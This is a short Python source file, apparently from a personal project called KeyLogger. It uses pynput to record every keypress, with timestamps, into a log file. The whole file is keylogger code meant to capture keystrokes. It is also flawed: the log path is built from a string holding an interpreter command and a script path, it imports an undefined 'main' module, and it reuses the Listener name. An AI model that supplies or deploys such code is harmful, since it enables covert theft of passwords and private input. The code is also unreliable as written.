import main
from pynput.keyboard import Key, Listener
import logging

log_dir = r"c:\python312\python.exe c:\Users\sassa\OneDrive\Documents\GitHub\KeyLogger\main.py"
logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as Listener:
    Listener.join();